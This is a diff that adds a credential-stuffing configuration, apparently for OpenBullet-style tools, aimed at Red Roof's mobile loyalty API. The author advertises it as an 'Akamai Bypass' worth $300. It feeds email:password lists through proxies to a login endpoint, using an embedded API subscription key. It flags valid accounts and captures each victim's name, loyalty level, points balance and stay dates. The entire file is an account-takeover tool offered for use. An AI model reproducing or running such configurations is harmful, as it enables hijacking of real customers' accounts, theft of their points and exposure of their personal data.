@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "Redroof iOS Api YASHVIR",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-11T03:39:15.5134565+04:00",
+  "AdditionalInfo": "[Akamai Bypass] Worth $300",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://api-gateway.redistay.com/v3/prd/api/loyalty/IsUserValid" 
+  CONTENT "{\"Env\":\"prd\",\"Device\":\"RedRoofMobile\",\"Username\":\"<USER>\",\"Password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api-gateway.redistay.com" 
+  HEADER "Accept: application/json" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Ocp-Apim-Subscription-Key: 364ccf10e4c14009b2fc8f2893bfd379" 
+  HEADER "User-Agent: Red%20Roof/274 CFNetwork/1329 Darwin/21.3.0" 
+  HEADER "Accept-Language: en-ca" 
+  HEADER "Content-Length: 104" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "500" 
+    KEY "success\": false" 
+  KEYCHAIN Success OR 
+    KEY "success\": true" 
+
+#Id PARSE "<SOURCE>" JSON "Id" -> VAR "Id" 
+
+#FirstName PARSE "<SOURCE>" JSON "FirstName" CreateEmpty=FALSE -> CAP "FirstName" 
+
+#LastName PARSE "<SOURCE>" JSON "LastName" CreateEmpty=FALSE -> CAP "LastName" 
+
+#Level PARSE "<SOURCE>" JSON "Level" CreateEmpty=FALSE -> CAP "Level" 
+
+#PointsBalance PARSE "<SOURCE>" JSON "PointsBalance" CreateEmpty=FALSE -> CAP "PointsBalance" 
+
+#LifetimePointsEarned PARSE "<SOURCE>" JSON "LifetimePointsEarned" CreateEmpty=FALSE -> CAP "LifetimePointsEarned" 
+
+#FirstStayDate PARSE "<SOURCE>" JSON "FirstStayDate" CreateEmpty=FALSE -> CAP "FirstStayDate" 
+
+#LastStayDate PARSE "<SOURCE>" JSON "LastStayDate" CreateEmpty=FALSE -> CAP "LastStayDate" 
+
+#AUTHOR FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config By " 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<PointsBalance>" EqualTo "0" 
+  KEYCHAIN Success OR 
+    KEY "<PointsBalance>" GreaterThan "1" 
+
